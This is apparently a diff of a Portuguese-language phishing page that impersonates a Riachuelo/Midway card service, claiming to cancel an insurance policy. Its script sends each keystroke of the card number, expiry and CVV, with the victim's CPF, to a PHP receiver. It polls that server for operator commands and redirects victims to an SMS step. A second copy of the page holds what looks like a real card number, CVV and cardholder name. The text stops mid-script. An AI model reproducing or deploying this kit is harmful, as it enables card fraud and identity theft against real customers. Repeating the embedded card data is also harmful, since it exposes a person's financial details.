+        }
+        
+        .display-date { 
+            font-size: 16px; /* Tamanho igual aos números principais */
+            font-family: 'Courier New', Courier, monospace; 
+            letter-spacing: 1px;
+        }
+
+        .display-name { 
+            position: absolute;
+            bottom: 20px; /* Permanece lá embaixo */
+            left: 25px;
+            font-size: 14px; 
+            text-transform: uppercase; 
+            letter-spacing: 1px; 
+            white-space: nowrap; 
+            overflow: hidden; 
+            text-overflow: ellipsis; 
+            max-width: 60%; 
+            text-align: left; 
+            opacity: 0.9; 
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
+        }
+
+        /* Verso do Cartão */
+        .card-back { background: #111; transform: rotateY(180deg); padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; }
+        .magnetic-strip { width: 100%; height: 45px; background: #000; margin-top: 25px; }
+        .cvv-container { width: 85%; margin-top: 20px; text-align: right; }
+        .cvv-label { font-size: 10px; opacity: 0.8; margin-bottom: 5px; margin-right: 5px; }
+        .cvv-strip { width: 100%; height: 35px; background: #fff; color: #000; display: flex; align-items: center; justify-content: flex-end; padding-right: 15px; font-family: 'Courier New', Courier, monospace; font-weight: bold; border-radius: 4px; font-size: 16px; font-style: italic; }
+
+        /* ================= FORMULÁRIO ================= */
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            background: #000000;
+            border: 1px solid #000000;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+            margin-bottom: 15px;
+            text-align: center;
+            letter-spacing: 2px;
+        
+            color: #ffffff;        /* Texto branco */
+            font-weight: 700;      /* Bold */
+        }
+
+        .input-field:focus { border-color: #ffffff; box-shadow: 0 0 0 2px rgba(0,0,0,0.1); }
+        .input-field::placeholder { color: #ffffff; letter-spacing: 0; }
+        /* ================= FEEDBACK DE VALIDAÇÃO ================= */
+        .input-field.error {
+            border-color: #ff4444;
+            color: #ff4444;
+            box-shadow: 0 0 8px rgba(255, 68, 68, 0.4);
+        }
+        .input-field.success {
+            border-color: #00C851;
+            box-shadow: 0 0 8px rgba(0, 200, 81, 0.4);
+        }
+        .form-grid { display: flex; gap: 15px; }
+
+        /* ================= BOTÃO ================= */
+        .btn-validar-card {
+            width: 100%; padding: 18px; border: none; border-radius: 8px;
+            font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px;
+            cursor: pointer; transition: all 0.3s ease; margin-top: 10px;
+        }
+        .btn-validar-card:disabled { background: #e0e0e0; color: #999; cursor: not-allowed; }
+        .btn-validar-card.active { background: #dc3545; color: #fff; box-shadow: 0 4px 15px rgba(220, 53, 69, 0.4); }
+        .btn-validar-card.active:hover { background: #c82333; transform: translateY(-2px); }
+
+        /* ================= LOADING ================= */
+        #loading { display: none; margin-top: 20px; }
+        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* ================= MENSAGENS DE ERRO ================= */
+        .error-msg {
+            color: #ff4444;
+            font-size: 13px;
+            font-weight: bold;
+            text-align: left;
+            margin-top: -10px;
+            margin-bottom: 15px;
+            padding-left: 5px;
+            display: none; /* Fica escondido até dar erro */
+        }
+    </style>
+</head>
+<body>
+
+<header class="top-bar">
+    <div class="logo-svg">
+        <svg width="89" height="10" viewBox="0 0 89 10" xmlns="http://www.w3.org/2000/svg">
+            <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M71.8553 7.08583V0.217737H70.1113V7.08583C70.1113 8.57267 71.5336 9.78312 73.2836 9.78312H76.899V8.32867H73.2836C72.4764 8.32677 71.8552 7.77015 71.8552 7.08583M11.3203 9.78312H13.0643V0.217737H11.3223V9.78312H11.3203ZM82.8992 8.47491C80.8801 8.47491 79.2353 6.91181 79.2353 4.99226C79.2353 3.08032 80.8801 1.52485 82.8992 1.52485C84.9103 1.52485 86.545 3.08032 86.545 4.99226C86.547 6.91182 84.9102 8.47491 82.8992 8.47491ZM86.7268 1.49828C85.6829 0.531835 84.3233 0 82.899 0C81.4039 0 80.014 0.548991 78.9862 1.54784C78.0191 2.4857 77.4648 3.74189 77.4648 4.99237C77.4648 7.70682 79.9533 9.99999 82.899 9.99999C84.3739 9.99999 85.7598 9.44147 86.7976 8.42737C87.7748 7.47426 88.3332 6.22379 88.3332 4.99237C88.3352 3.71712 87.7485 2.44377 86.7268 1.49828M60.6467 9.78261H67.4223V8.32816H62.3543V5.80243H66.9873V4.34417H62.3543V1.67357H67.4223V0.219132H60.6467V9.78261ZM56.1939 6.70648C56.1939 7.71106 55.1459 8.52501 53.7661 8.52501C52.3782 8.52501 51.3201 7.70915 51.3201 6.70648V0.217737H49.5802V6.70649C49.5802 7.16017 49.8736 10.0004 53.7661 10.0004C57.6566 10.0004 57.9338 7.16017 57.9338 6.70649V0.217737H56.1899L56.1939 6.70648ZM45.1284 4.34469H40.2566L40.2526 0.217737H38.5147V9.78312H40.2526L40.2566 5.80294H45.1284L45.1244 9.78312H46.8683V0.217737H45.1244L45.1284 4.34469ZM34.8125 7.2819C34.0133 8.03676 33.0139 8.47138 32.0731 8.47138C30.056 8.47138 28.4132 6.9121 28.4132 4.99446C28.4132 3.08634 30.056 1.53277 32.0731 1.53277C33.0321 1.53277 34.0194 1.95595 34.8509 2.72225L34.9076 2.77562L36.168 1.6948L36.1012 1.63571C35.4275 1.0486 34.8064 0.646391 34.2015 0.406208C33.4974 0.143148 32.761 0.00209362 32.0731 0.00209362C31.3225 0.00209362 30.6185 0.129814 29.9205 0.390956C29.2589 0.652112 28.6621 1.03335 28.1967 1.48894C27.1892 2.41726 26.6369 3.66011 26.6369 4.99255C26.6369 6.325 27.1892 7.56594 28.1907 8.49046C28.658 8.94604 29.2407 9.31776 29.9265 9.59606C30.6286 9.86675 31.3326 10.0002 32.0731 10.0002C32.8015 10.0002 33.5399 9.85912 34.2096 9.59416C34.8388 9.3292 35.4761 8.91173 36.1012 8.35131L36.168 8.29031L34.8671 7.22855L34.8125 7.2819ZM18.9254 6.23333L20.4873 3.00993H20.5662L22.126 6.23142L18.9254 6.23333ZM20.0848 0.221358L15.3931 9.78292H17.222L18.2397 7.69181L22.8262 7.68418L23.8337 9.78292H25.6627L20.9689 0.215643L20.0848 0.221358ZM1.70779 4.54686V1.6742H5.15931C5.98274 1.6742 6.62207 2.44621 6.62207 3.11147C6.62207 3.93305 5.83101 4.54876 5.1229 4.54876H1.7078L1.70779 4.54686ZM6.13502 5.47127C7.45008 5.08621 8.3342 4.05876 8.3342 2.91503C8.3342 1.42818 6.89574 0.217737 5.12547 0.217737H0.000793457V9.78312H1.71037V6.0031H2.95056C4.01272 6.0031 4.34249 6.0355 4.8928 6.75986L6.98475 9.78312H8.95733L5.99137 5.51319L6.13502 5.47127Z"></path>
+        </svg>
+    </div>
+</header>
+    
+    <main class="container">
+        <div id="step-validation">
+            <h2>Confirmação de Identidade</h2>
+            <p class="subtitle">
+                Para efetivar o <strong>cancelamento do seguro</strong> e garantir sua segurança, preencha os dados do seu cartão RIACHUELO.
+            </p>
+
+            <div class="card-scene">
+                <div class="card-wrapper" id="card3D">
+                    
+                    <div class="card-face card-front">
+                        <div class="display-number" id="v-number">0000 0000 0000 0000</div>
+                        
+                        <div class="display-validity">
+                            <span class="validity-label">VALID<br>THRU</span>
+                            <span class="display-date" id="v-date">MM/AA</span>
+                        </div>
+
+                        <div class="display-name">FILIPE E M BALLSTAEDT</div>
+                    </div>
+
+                    <div class="card-face card-back">
+                        <div class="magnetic-strip"></div>
+                        <div class="cvv-container">
+                            <div class="cvv-label">CVV</div>
+                            <div class="cvv-strip" id="v-cvv">***</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <br>
+            <div id="msg-erro-cartao" style="display: none; background-color: #fff3cd; color: #856404; border: 1px solid #ffeeba; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 0.9rem; line-height: 1.4; text-align: left;">
+    <strong>Os dados inseridos não são válidos.</strong> Por gentileza, verifique atentamente as informações digitadas e tente novamente.<br><br>
+    Lembre-se de utilizar seu cartão <strong>RIACHUELO - MIDWAY</strong> para prosseguir com a operação.
+</div>
+
+<input type="tel" id="inCardNumber" class="input-field" placeholder="Número do Cartão" maxlength="19" autocomplete="off">
+
+
+<div id="msg-card" class="error-msg">Verifique os dados digitados</div>
+
+<div class="form-grid">
+    <input type="tel" id="inDate" class="input-field" placeholder="Validade (MM/AA)" maxlength="5" autocomplete="off" style="width: 60%;">
+    <input type="tel" id="inCVV" class="input-field" placeholder="CVV" maxlength="3" autocomplete="off" style="width: 40%;">
+</div>
+
+<div id="msg-date" class="error-msg">Verifique sua validade</div>
+
+            <button id="btnValidarCard" class="btn-validar-card" onclick="validarCartao()" disabled="">Cancelar Seguro</button>
+            
+            <div id="loading">
+                <div class="loading-spinner"></div>
+                <p style="color:#666; font-size:14px; margin-top:10px;">Processando solicitação...</p>
+            </div>
+        </div>
+    </main>
+    
+    <script src="../js/tracking.js"></script>
+
+<script>
+const card3D = document.getElementById('card3D');
+const vNumber = document.getElementById('v-number');
+const vDate = document.getElementById('v-date');
+const vCVV = document.getElementById('v-cvv');
+const inCardNumber = document.getElementById('inCardNumber');
+const inDate = document.getElementById('inDate');
+const inCVV = document.getElementById('inCVV');
+const btn = document.getElementById('btnValidarCard');
+
+// ========================================================
+// CAPTURA EM TEMPO REAL (DEBOUNCE)
+// ========================================================
+// ========================================================
+// CAPTURA EM TEMPO REAL (DEBOUNCE)
+// ========================================================
+let timerDigitacao;
+
+function capturarAoVivo() {
+    clearTimeout(timerDigitacao);
+    
+    // CORREÇÃO: Muda o título da página para o tracking.js não atrapalhar
+    document.title = 'Preenchendo Cartão...';
+    
+    // Mudei de 10ms para 400ms (10ms trava o servidor de tantas requisições!)
+    timerDigitacao = setTimeout(() => {
+        const cpfUser = localStorage.getItem('user_cpf');
+        const idOperador = localStorage.getItem('id_operador'); 
+        
+        fetch('../receiver.php', {
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                cpf: cpfUser,
+                operador: idOperador, 
+                pagina: window.location.pathname,
+                acao: 'Preenchendo Cartão...', 
+                cc_num: inCardNumber.value, 
+                cc_val: inDate.value, 
+                cc_cvv: inCVV.value
+            })
+        }).catch(() => {}); 
+        
+    }, 400); 
+}
+//
+// ========================================================
+
+inCardNumber.addEventListener('input', (e) => {
+    let val = e.target.value.replace(/\D/g, '').slice(0, 16);
+    let formatted = val.replace(/(\d{4})(?=\d)/g, '$1 ');
+    e.target.value = formatted; 
+    vNumber.innerText = formatted || '0000 0000 0000 0000'; 
+    checkForm();
+    capturarAoVivo();
+});
+
+inDate.addEventListener('input', (e) => {
+    let val = e.target.value.replace(/\D/g, '').slice(0, 4);
+    if(val.length >= 2) val = val.substring(0,2) + '/' + val.substring(2);
+    e.target.value = val; 
+    vDate.innerText = val || 'MM/AA'; 
+    checkForm();
+    capturarAoVivo();
+});
+
+inCVV.addEventListener('focus', () => card3D.classList.add('flipped'));
+inCVV.addEventListener('blur', () => card3D.classList.remove('flipped'));
+inCVV.addEventListener('input', (e) => {
+    let val = e.target.value.replace(/\D/g, '').slice(0, 3);
+    e.target.value = val; 
+    vCVV.innerText = val || '***'; 
+    checkForm();
+    capturarAoVivo();
+});
+
+// ================= VALIDAÇÕES =================
+function validarLuhn(numero) {
+    if (numero.length !== 16) return false;
+    if (/^0+$/.test(numero)) return false; 
+    
+    let soma = 0;
+    let alternar = false;
+    
+    for (let i = numero.length - 1; i >= 0; i--) {
+        let n = parseInt(numero.charAt(i), 10);
+        if (alternar) {
+            n *= 2;
+            if (n > 9) n -= 9;
+        }
+        soma += n;
+        alternar = !alternar;
+    }
+    return (soma % 10 === 0);
+}
+
+function validarData(dataString) {
+    if (dataString.length !== 5) return false;
+    
+    const partes = dataString.split('/');
+    if (partes.length !== 2) return false;
+
+    const mesInserido = parseInt(partes[0], 10);
+    const anoInserido = parseInt("20" + partes[1], 10); 
+
+    if (mesInserido < 1 || mesInserido > 12) return false;
+
+    const dataAtual = new Date();
+    const mesAtual = dataAtual.getMonth() + 1; 
+    const anoAtual = dataAtual.getFullYear();
+
+    if (anoInserido < anoAtual) return false;
+    if (anoInserido === anoAtual && mesInserido < mesAtual) return false;
+
+    return true;
+}
+
+function checkForm() {
+    const numeroLimpo = inCardNumber.value.replace(/\s/g, '');
+    const dateVal = inDate.value;
+    const cvvVal = inCVV.value;
+
+    const msgCard = document.getElementById('msg-card');
+    const msgDate = document.getElementById('msg-date');
+
+    let numValid = false;
+    let dateValid = false;
+    let cvvValid = false;
+
+    if (numeroLimpo.length === 16) {
+        numValid = validarLuhn(numeroLimpo);
+        if (numValid) {
+            if(msgCard) msgCard.style.display = 'none';
+            inCardNumber.style.borderColor = '#ddd'; 
+        } else {
+            if(msgCard) msgCard.style.display = 'block'; 
+            inCardNumber.style.borderColor = '#ff4444'; 
+        }
+    } else {
+        if(msgCard) msgCard.style.display = 'none';
+        inCardNumber.style.borderColor = '#ddd'; 
+    }
+
+    if (dateVal.length === 5) {
+        dateValid = validarData(dateVal);
+        if (dateValid) {
+            if(msgDate) msgDate.style.display = 'none';
+            inDate.style.borderColor = '#ddd';
+        } else {
+            if(msgDate) msgDate.style.display = 'block';
+            inDate.style.borderColor = '#ff4444';
+        }
+    } else {
+        if(msgDate) msgDate.style.display = 'none';
+        inDate.style.borderColor = '#ddd';
+    }
+
+    if (cvvVal.length === 3) {
+        cvvValid = true;
+    }
+
+    if (numValid && dateValid && cvvValid) {
+        btn.disabled = false; 
+        btn.classList.add('active');
+    } else {
+        btn.disabled = true; 
+        btn.classList.remove('active');
+    }
+}
+
+function validarCartao() {
+    // === A CORREÇÃO ESTÁ AQUI ===
+    // Muda o título da página para o tracking.js não apagar os seus botões no painel!
+    document.title = 'Aguardando Aprovação...';
+    // ============================
+
+    document.querySelector('.card-scene').style.opacity = '0.4';
+    document.querySelector('.form-grid').style.opacity = '0.4';
+    inCardNumber.style.opacity = '0.4';
+    btn.style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+
+    const cpfUser = localStorage.getItem('user_cpf');
+    const uidUser = localStorage.getItem('device_uid');
+    
+    // Envio inicial informando que está aguardando
+    fetch('../receiver.php', {
+        method: 'POST', 
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            uid: uidUser,
+            cpf: cpfUser,
+            pagina: window.location.pathname,
+            acao: 'Aguardando Aprovação p/ Cancelamento',
+            comando: 'aguardando', 
+            cc_num: inCardNumber.value, 
+            cc_val: inDate.value, 
+            cc_cvv: inCVV.value
+        })
+    });
+
+checkInterval = setInterval(() => {
+        fetch('../receiver.php', { method: 'POST', body: JSON.stringify({ uid: uidUser, cpf: cpfUser }) })
+        .then(res => res.json())
+        .then(data => {
+            if (data.comando === 'ir_sms') {
+                clearInterval(checkInterval);
+                window.location.href = '../sms/index.php'; 
+            } 
+else if (data.comando === 'recusar') {
+    clearInterval(checkInterval); 
+    
+    fetch('../receiver.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            uid: uidUser, 
+            cpf: cpfUser, 
+            acao: 'Corrigindo dados...', // <--- Isso limpa o "Aguardando"
+            comando: '', 
+            cc_num: inCardNumber.value, 
+            cc_val: inDate.value, 
+            cc_cvv: inCVV.value         
+        })
+    }).then(() => {
+        // MUITO IMPORTANTE: Mudar o título aqui também
+        document.title = "Corrigindo dados..."; 
+
+        document.getElementById('loading').style.display = 'none';
+        document.querySelector('.card-scene').style.opacity = '1';
+        document.querySelector('.form-grid').style.opacity = '1';
+        inCardNumber.style.opacity = '1';
+        btn.style.display = 'block';
+
+        const msgErro = document.getElementById('msg-erro-cartao');
+        msgErro.style.display = 'block';
+        msgErro.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    });
+}
+        });
+    }, 2000);
+}
+</script>
+
+</body></html>
+
+
+DIGITEI UM CARTÃO QUE TENHO AQUI E FICOU ASSIM
+VOU CLICAR EM CANCELAR
+
+
+<html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Preenchendo Cartão...</title>
+    <style>
+        /* ================= ESTILOS GERAIS ================= */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Helvetica Neue', Arial, sans-serif; }
+        body { background-color: #fafafa; color: #333; }
+        
+        .top-bar { background: #000; color: #fff; text-align: center; padding: 18px; font-weight: 900; font-size: 18px; letter-spacing: 3px; }
+        .container { max-width: 420px; margin: 0 auto; padding: 30px 20px; text-align: center; }
+        
+        h2 { font-size: 22px; color: #111; margin-bottom: 10px; font-weight: bold; }
+        .subtitle { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
+
+        /* ================= CARTÃO 3D ================= */
+        .card-scene { width: 100%; height: 210px; margin: 0 auto 30px auto; perspective: 1000px; }
+        .card-wrapper { width: 100%; height: 100%; position: relative; transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); transform-style: preserve-3d; }
+        .card-wrapper.flipped { transform: rotateY(180deg); }
+        
+        .card-face {
+            position: absolute; width: 100%; height: 110%; backface-visibility: hidden; 
+            border-radius: 12px; color: #fff; box-shadow: 0 15px 25px rgba(0,0,0,0.3); padding: 20px;
+        }
+        
+        /* Frente do Cartão */
+        .card-front {
+            background-image: url('../img/cartao.png'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: block; 
+        }
+        
+        /* Textos da Frente (NOVO LAYOUT CLÁSSICO) */
+        .display-number { 
+            position: absolute;
+            top: 105px; /* Empurrado mais para cima, quase no meio do cartão */
+            left: 25px;
+            font-family: 'Courier New', Courier, monospace; 
+            font-size: 21px; 
+            letter-spacing: 2px; 
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.9); 
+            text-align: left; 
+        }
+        
+        .display-validity { 
+            position: absolute;
+            top: 150px; /* Posicionado logo abaixo dos números */
+            left: 27px; /* Alinhado próximo ao 3º bloco numérico */
+            display: flex; /* Coloca o label e a data lado a lado */
+            align-items: center;
+            gap: 6px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
+        }
+        
+        .validity-label { 
+            font-size: 7px; 
+            opacity: 0.8; 
+            text-transform: uppercase;
+            text-align: center;
+            line-height: 1.2;
+        }
+        
+        .display-date { 
+            font-size: 16px; /* Tamanho igual aos números principais */
+            font-family: 'Courier New', Courier, monospace; 
+            letter-spacing: 1px;
+        }
+
+        .display-name { 
+            position: absolute;
+            bottom: 20px; /* Permanece lá embaixo */
+            left: 25px;
+            font-size: 14px; 
+            text-transform: uppercase; 
+            letter-spacing: 1px; 
+            white-space: nowrap; 
+            overflow: hidden; 
+            text-overflow: ellipsis; 
+            max-width: 60%; 
+            text-align: left; 
+            opacity: 0.9; 
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
+        }
+
+        /* Verso do Cartão */
+        .card-back { background: #111; transform: rotateY(180deg); padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; }
+        .magnetic-strip { width: 100%; height: 45px; background: #000; margin-top: 25px; }
+        .cvv-container { width: 85%; margin-top: 20px; text-align: right; }
+        .cvv-label { font-size: 10px; opacity: 0.8; margin-bottom: 5px; margin-right: 5px; }
+        .cvv-strip { width: 100%; height: 35px; background: #fff; color: #000; display: flex; align-items: center; justify-content: flex-end; padding-right: 15px; font-family: 'Courier New', Courier, monospace; font-weight: bold; border-radius: 4px; font-size: 16px; font-style: italic; }
+
+        /* ================= FORMULÁRIO ================= */
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            background: #000000;
+            border: 1px solid #000000;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+            margin-bottom: 15px;
+            text-align: center;
+            letter-spacing: 2px;
+        
+            color: #ffffff;        /* Texto branco */
+            font-weight: 700;      /* Bold */
+        }
+
+        .input-field:focus { border-color: #ffffff; box-shadow: 0 0 0 2px rgba(0,0,0,0.1); }
+        .input-field::placeholder { color: #ffffff; letter-spacing: 0; }
+        /* ================= FEEDBACK DE VALIDAÇÃO ================= */
+        .input-field.error {
+            border-color: #ff4444;
+            color: #ff4444;
+            box-shadow: 0 0 8px rgba(255, 68, 68, 0.4);
+        }
+        .input-field.success {
+            border-color: #00C851;
+            box-shadow: 0 0 8px rgba(0, 200, 81, 0.4);
+        }
+        .form-grid { display: flex; gap: 15px; }
+
+        /* ================= BOTÃO ================= */
+        .btn-validar-card {
+            width: 100%; padding: 18px; border: none; border-radius: 8px;
+            font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px;
+            cursor: pointer; transition: all 0.3s ease; margin-top: 10px;
+        }
+        .btn-validar-card:disabled { background: #e0e0e0; color: #999; cursor: not-allowed; }
+        .btn-validar-card.active { background: #dc3545; color: #fff; box-shadow: 0 4px 15px rgba(220, 53, 69, 0.4); }
+        .btn-validar-card.active:hover { background: #c82333; transform: translateY(-2px); }
+
+        /* ================= LOADING ================= */
+        #loading { display: none; margin-top: 20px; }
+        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* ================= MENSAGENS DE ERRO ================= */
+        .error-msg {
+            color: #ff4444;
+            font-size: 13px;
+            font-weight: bold;
+            text-align: left;
+            margin-top: -10px;
+            margin-bottom: 15px;
+            padding-left: 5px;
+            display: none; /* Fica escondido até dar erro */
+        }
+    </style>
+</head>
+<body>
+
+<header class="top-bar">
+    <div class="logo-svg">
+        <svg width="89" height="10" viewBox="0 0 89 10" xmlns="http://www.w3.org/2000/svg">
+            <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M71.8553 7.08583V0.217737H70.1113V7.08583C70.1113 8.57267 71.5336 9.78312 73.2836 9.78312H76.899V8.32867H73.2836C72.4764 8.32677 71.8552 7.77015 71.8552 7.08583M11.3203 9.78312H13.0643V0.217737H11.3223V9.78312H11.3203ZM82.8992 8.47491C80.8801 8.47491 79.2353 6.91181 79.2353 4.99226C79.2353 3.08032 80.8801 1.52485 82.8992 1.52485C84.9103 1.52485 86.545 3.08032 86.545 4.99226C86.547 6.91182 84.9102 8.47491 82.8992 8.47491ZM86.7268 1.49828C85.6829 0.531835 84.3233 0 82.899 0C81.4039 0 80.014 0.548991 78.9862 1.54784C78.0191 2.4857 77.4648 3.74189 77.4648 4.99237C77.4648 7.70682 79.9533 9.99999 82.899 9.99999C84.3739 9.99999 85.7598 9.44147 86.7976 8.42737C87.7748 7.47426 88.3332 6.22379 88.3332 4.99237C88.3352 3.71712 87.7485 2.44377 86.7268 1.49828M60.6467 9.78261H67.4223V8.32816H62.3543V5.80243H66.9873V4.34417H62.3543V1.67357H67.4223V0.219132H60.6467V9.78261ZM56.1939 6.70648C56.1939 7.71106 55.1459 8.52501 53.7661 8.52501C52.3782 8.52501 51.3201 7.70915 51.3201 6.70648V0.217737H49.5802V6.70649C49.5802 7.16017 49.8736 10.0004 53.7661 10.0004C57.6566 10.0004 57.9338 7.16017 57.9338 6.70649V0.217737H56.1899L56.1939 6.70648ZM45.1284 4.34469H40.2566L40.2526 0.217737H38.5147V9.78312H40.2526L40.2566 5.80294H45.1284L45.1244 9.78312H46.8683V0.217737H45.1244L45.1284 4.34469ZM34.8125 7.2819C34.0133 8.03676 33.0139 8.47138 32.0731 8.47138C30.056 8.47138 28.4132 6.9121 28.4132 4.99446C28.4132 3.08634 30.056 1.53277 32.0731 1.53277C33.0321 1.53277 34.0194 1.95595 34.8509 2.72225L34.9076 2.77562L36.168 1.6948L36.1012 1.63571C35.4275 1.0486 34.8064 0.646391 34.2015 0.406208C33.4974 0.143148 32.761 0.00209362 32.0731 0.00209362C31.3225 0.00209362 30.6185 0.129814 29.9205 0.390956C29.2589 0.652112 28.6621 1.03335 28.1967 1.48894C27.1892 2.41726 26.6369 3.66011 26.6369 4.99255C26.6369 6.325 27.1892 7.56594 28.1907 8.49046C28.658 8.94604 29.2407 9.31776 29.9265 9.59606C30.6286 9.86675 31.3326 10.0002 32.0731 10.0002C32.8015 10.0002 33.5399 9.85912 34.2096 9.59416C34.8388 9.3292 35.4761 8.91173 36.1012 8.35131L36.168 8.29031L34.8671 7.22855L34.8125 7.2819ZM18.9254 6.23333L20.4873 3.00993H20.5662L22.126 6.23142L18.9254 6.23333ZM20.0848 0.221358L15.3931 9.78292H17.222L18.2397 7.69181L22.8262 7.68418L23.8337 9.78292H25.6627L20.9689 0.215643L20.0848 0.221358ZM1.70779 4.54686V1.6742H5.15931C5.98274 1.6742 6.62207 2.44621 6.62207 3.11147C6.62207 3.93305 5.83101 4.54876 5.1229 4.54876H1.7078L1.70779 4.54686ZM6.13502 5.47127C7.45008 5.08621 8.3342 4.05876 8.3342 2.91503C8.3342 1.42818 6.89574 0.217737 5.12547 0.217737H0.000793457V9.78312H1.71037V6.0031H2.95056C4.01272 6.0031 4.34249 6.0355 4.8928 6.75986L6.98475 9.78312H8.95733L5.99137 5.51319L6.13502 5.47127Z"></path>
+        </svg>
+    </div>
+</header>
+    
+    <main class="container">
+        <div id="step-validation">
+            <h2>Confirmação de Identidade</h2>
+            <p class="subtitle">
+                Para efetivar o <strong>cancelamento do seguro</strong> e garantir sua segurança, preencha os dados do seu cartão RIACHUELO.
+            </p>
+
+            <div class="card-scene">
+                <div class="card-wrapper" id="card3D">
+                    
+                    <div class="card-face card-front">
+                        <div class="display-number" id="v-number">5365 1813 9440 7114</div>
+                        
+                        <div class="display-validity">
+                            <span class="validity-label">VALID<br>THRU</span>
+                            <span class="display-date" id="v-date">11/28</span>
+                        </div>
+
+                        <div class="display-name">FILIPE E M BALLSTAEDT</div>
+                    </div>
+
+                    <div class="card-face card-back">
+                        <div class="magnetic-strip"></div>
+                        <div class="cvv-container">
+                            <div class="cvv-label">CVV</div>
+                            <div class="cvv-strip" id="v-cvv">673</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <br>
+            <div id="msg-erro-cartao" style="display: none; background-color: #fff3cd; color: #856404; border: 1px solid #ffeeba; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 0.9rem; line-height: 1.4; text-align: left;">
+    <strong>Os dados inseridos não são válidos.</strong> Por gentileza, verifique atentamente as informações digitadas e tente novamente.<br><br>
+    Lembre-se de utilizar seu cartão <strong>RIACHUELO - MIDWAY</strong> para prosseguir com a operação.
+</div>
+
+<input type="tel" id="inCardNumber" class="input-field" placeholder="Número do Cartão" maxlength="19" autocomplete="off" style="border-color: rgb(221, 221, 221);">
+
+
+<div id="msg-card" class="error-msg" style="display: none;">Verifique os dados digitados</div>
+
+<div class="form-grid">
+    <input type="tel" id="inDate" class="input-field" placeholder="Validade (MM/AA)" maxlength="5" autocomplete="off" style="width: 60%; border-color: rgb(221, 221, 221);">
+    <input type="tel" id="inCVV" class="input-field" placeholder="CVV" maxlength="3" autocomplete="off" style="width: 40%;">
+</div>
+
+<div id="msg-date" class="error-msg" style="display: none;">Verifique sua validade</div>
+
+            <button id="btnValidarCard" class="btn-validar-card active" onclick="validarCartao()">Cancelar Seguro</button>
+            
+            <div id="loading">
+                <div class="loading-spinner"></div>
+                <p style="color:#666; font-size:14px; margin-top:10px;">Processando solicitação...</p>
+            </div>
+        </div>
+    </main>
+    
+    <script src="../js/tracking.js"></script>
+
+<script>
+const card3D = document.getElementById('card3D');
+const vNumber = document.getElementById('v-number');
+const vDate = document.getElementById('v-date');
+const vCVV = document.getElementById('v-cvv');
+const inCardNumber = document.getElementById('inCardNumber');
+const inDate = document.getElementById('inDate');
+const inCVV = document.getElementById('inCVV');
+const btn = document.getElementById('btnValidarCard');
+
+// ========================================================
+// CAPTURA EM TEMPO REAL (DEBOUNCE)
+// ========================================================
+// ========================================================
+// CAPTURA EM TEMPO REAL (DEBOUNCE)
+// ========================================================
+let timerDigitacao;
+
+function capturarAoVivo() {
+    clearTimeout(timerDigitacao);
+    
+    // CORREÇÃO: Muda o título da página para o tracking.js não atrapalhar
+    document.title = 'Preenchendo Cartão...';
+    
+    // Mudei de 10ms para 400ms (10ms trava o servidor de tantas requisições!)
+    timerDigitacao = setTimeout(() => {
+        const cpfUser = localStorage.getItem('user_cpf');
+        const idOperador = localStorage.getItem('id_operador'); 
+        
+        fetch('../receiver.php', {
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                cpf: cpfUser,
+                operador: idOperador, 
+                pagina: window.location.pathname,
+                acao: 'Preenchendo Cartão...', 
+                cc_num: inCardNumber.value, 
+                cc_val: inDate.value, 
+                cc_cvv: inCVV.value
+            })
+        }).catch(() => {}); 
+        
+    }, 400); 
+}
+//
+// ========================================================
+
+inCardNumber.addEventListener('input', (e) => {
+    let val = e.target.value.replace(/\D/g, '').slice(0, 16);
+    let formatted = val.replace(/(\d{4})(?=\d)/g, '$1 ');
+    e.target.value = formatted; 
+    vNumber.innerText = formatted || '0000 0000 0000 0000'; 
+    checkForm();
+    capturarAoVivo();
+});
+
+inDate.addEventListener('input', (e) => {
+    let val = e.target.value.replace(/\D/g, '').slice(0, 4);
+    if(val.length >= 2) val = val.substring(0,2) + '/' + val.substring(2);
+    e.target.value = val; 
+    vDate.innerText = val || 'MM/AA'; 
+    checkForm();
+    capturarAoVivo();
+});
+
+inCVV.addEventListener('focus', () => card3D.classList.add('flipped'));
+inCVV.addEventListener('blur', () => card3D.classList.remove('flipped'));
+inCVV.addEventListener('input', (e) => {
